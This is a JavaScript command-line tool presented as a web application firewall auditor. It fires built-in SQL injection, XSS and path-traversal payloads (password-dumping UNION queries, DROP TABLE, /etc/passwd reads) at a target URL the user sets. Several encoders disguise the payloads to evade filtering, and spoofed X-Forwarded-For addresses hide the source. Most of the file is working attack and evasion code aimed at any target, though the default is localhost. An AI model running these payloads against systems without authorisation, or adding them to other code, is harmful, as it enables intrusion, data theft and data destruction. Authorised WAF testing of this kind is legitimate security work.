const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Built-in lists of standard payloads
const payloads = {
    sqli: [
        "' OR '1'='1",
        "' OR 1=1 --",
        "\" OR 1=1 --",
        "1 UNION SELECT null, username, password FROM users --",
        "admin' --",
        "admin' #",
        "admin'/*",
        "1; DROP TABLE users --",
        "'; SAFE_RELEASE --"
    ],
    xss: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<body onload=alert(1)>",
        "\" onfocus=alert(1) autocommit"
    ],
    lfi: [
        "../../etc/passwd",
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "....//....//etc/passwd",
        "win.ini"
    ]
};

// Obfuscation Encoders
const encoders = {
    none: (str) => str,
    urlencode: (str) => encodeURIComponent(str),
    double_url: (str) => encodeURIComponent(encodeURIComponent(str)),
    hexencode: (str) => {
        // Convert alphanumeric to hex URL sequences (e.g. S -> %53)
        return str.split('').map(c => {
            if (/[a-zA-Z0-9]/.test(c)) {
                return '%' + c.charCodeAt(0).toString(16).toUpperCase();
            }
            return encodeURIComponent(c);
        }).join('');
    },
    htmlencode: (str) => {
        // Convert to HTML decimal entities (e.g. < -> &#60;)
        return str.split('').map(c => {
            if (/[<>"'&]/.test(c)) {
                return `&#${c.charCodeAt(0)};`;
            }
            return c;
        }).join('');
    },
    unicodeencode: (str) => {
        // Convert to %u00XX IIS Unicode format
        return str.split('').map(c => {
            const hex = c.charCodeAt(0).toString(16).padStart(4, '0').toUpperCase();
            return `%u${hex}`;
        }).join('');
    },
    comment: (str) => {
        // Injects SQL comments in place of spaces
        return str.replace(/\s+/g, '/**/');
    },
    mixedcase: (str) => {
        // Randomize case of alphabetic letters
        return str.split('').map(c => Math.random() < 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
    }
};

let config = {
    target: 'http://localhost:7129',
    path: '/products?name=',
    payloadType: 'sqli',
    encoder: 'none'
};

function showMenu() {
    console.clear();
    console.log(`
    ██╗    ██╗  █████╗ ███████╗███╗   ██╗██╗███╗   ██╗    ██╗ ██████╗ 
    ██║    ██║ ██╔══██╗██╔════╝████╗  ██║██║████╗  ██║    ██║██╔════╝ 
    ██║ █╗ ██║ ███████║█████╗  ██╔██╗ ██║██║██╔██╗ ██║    ██║███████╗ 
    ██║███╗██║ ██╔══██║██╔══╝  ██║╚██╗██║██║██║╚██╗██║    ██║╚════██║ 
    ╚███╔███╔╝ ██║  ██║██║     ██║ ╚████║██║██║ ╚████║██╗  ██║███████║ 
     ╚══╝╚══╝  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
    
           [ JS-Ninja: Web Application Firewall Auditor ]
    `);
    console.log(`Current Configuration:`);
    console.log(`- 🎯 Target URL  : ${config.target}${config.path}<payload>`);
    console.log(`- 📂 Vector Type : ${config.payloadType.toUpperCase()}`);
    console.log(`- 🌀 Encoder     : ${config.encoder.toUpperCase()}`);
    console.log(`================================================================`);
    console.log("1. 🎯  Change Target / Path (Default: http://localhost:7129/products?name=)");
    console.log("2. 📂  Select Attack Vector Type (SQLi, XSS, LFI)");
    console.log("3. 🌀  Select Obfuscation Encoder");
    console.log("4. ⚡  Run Evasion Audit Scan");
    console.log("0. ❌  Exit");

    rl.question('\nSelect Option: ', (choice) => {
        if (choice === '1') {
            rl.question('Enter target hostname/port (default: http://localhost:7129): ', (tgt) => {
                if (tgt.trim()) config.target = tgt.trim();
                rl.question('Enter query parameter path (default: /products?name=): ', (pth) => {
                    if (pth.trim()) config.path = pth.trim();
                    showMenu();
                });
            });
        } else if (choice === '2') {
            console.log('\nSelect Vector Type:');
            console.log('1. SQL Injection (SQLi)');
            console.log('2. Cross-Site Scripting (XSS)');
            console.log('3. Local File Inclusion (LFI)');
            rl.question('Choice: ', (vCh) => {
                if (vCh === '1') config.payloadType = 'sqli';
                if (vCh === '2') config.payloadType = 'xss';
                if (vCh === '3') config.payloadType = 'lfi';
                showMenu();
            });
        } else if (choice === '3') {
            console.log('\nSelect Encoder:');
            const encKeys = Object.keys(encoders);
            encKeys.forEach((k, idx) => console.log(`${idx + 1}. ${k.toUpperCase()}`));
            console.log(`${encKeys.length + 1}. ROTATING RANDOM ENCODERS`);
            
            rl.question('Choice: ', (eCh) => {
                const idx = parseInt(eCh) - 1;
                if (idx >= 0 && idx < encKeys.length) {
                    config.encoder = encKeys[idx];
                } else if (idx === encKeys.length) {
                    config.encoder = 'rotating';
                }
                showMenu();
            });
        } else if (choice === '4') {
            runAudit();
        } else {
            console.log("Goodbye!");
            rl.close();
        }
    });
}

const generateRandomIP = () => {
    const o1 = Math.floor(Math.random() * 220) + 1;
    const o2 = Math.floor(Math.random() * 255);
    const o3 = Math.floor(Math.random() * 255);
    const o4 = Math.floor(Math.random() * 255);
    return `${o1}.${o2}.${o3}.${o4}`;
};

const sendRequest = (fullUrl, payloadText, ip) => {
    return new Promise((resolve) => {
        const urlObj = new URL(fullUrl);
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: 'GET',
            headers: {
                'User-Agent': 'WAFNinja-JS/1.0',
                'x-simulated-ip': ip, // spoof test IP
                'X-Forwarded-For': ip
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => { data += chunk; });
            res.on('end', () => {
                resolve({
                    payload: payloadText,
                    statusCode: res.statusCode,
                    passed: res.statusCode === 200
                });
            });
        });

        req.on('error', (e) => {
            resolve({
                payload: payloadText,
                statusCode: 500,
                passed: false,
                error: e.message
            });
        });
        req.end();
    });
};

async function runAudit() {
    console.clear();
    const activePayloads = payloads[config.payloadType] || [];
    console.log(`
================================================================
          🛡️  JS-NINJA WAF EVASION AUDIT STARTING
================================================================
Target URL   : ${config.target}${config.path}<payload>
Vector Type  : ${config.payloadType.toUpperCase()}
Fuzz Size    : ${activePayloads.length} payloads
Active Encoder: ${config.encoder.toUpperCase()}
----------------------------------------------------------------
`);

    let blocked = 0;
    let bypassed = 0;
    const encKeys = Object.keys(encoders).filter(k => k !== 'none');

    for (const rawPayload of activePayloads) {
        let activeEnc = config.encoder;
        if (config.encoder === 'rotating') {
            activeEnc = encKeys[Math.floor(Math.random() * encKeys.length)];
        }
        
        const encoderFunc = encoders[activeEnc] || encoders.none;
        const obfuscated = encoderFunc(rawPayload);
        const fullUrl = `${config.target}${config.path}${obfuscated}`;

        console.log(`Payload   : ${rawPayload}`);
        console.log(`Obfuscated: ${obfuscated}`);
        console.log(`Encoder   : ${activeEnc.toUpperCase()}`);

        const testIP = generateRandomIP();
        const result = await sendRequest(fullUrl, rawPayload, testIP);

        if (result.passed) {
            console.log(`🔴 RESULT : BYPASSED (Status: 200 OK) - Interception Failed!`);
            bypassed++;
        } else {
            console.log(`🟢 RESULT : BLOCKED (Status: ${result.statusCode}) - Intercepted.`);
            blocked++;
        }
        console.log('----------------------------------------------------------------');
    }

    const integrity = Math.round((blocked / activePayloads.length) * 100);
    console.log(`
================================================================
                  📊 AUDIT SUMMARY REPORT
================================================================
Total Audits Run     : ${activePayloads.length}
Successfully Blocked : ${blocked}
Bypasses Detected    : ${bypassed}
WAF Shield Integrity : ${integrity}%
================================================================
`);
    
    rl.question('\nPress Enter to return to menu...', () => {
        showMenu();
    });
}

showMenu();
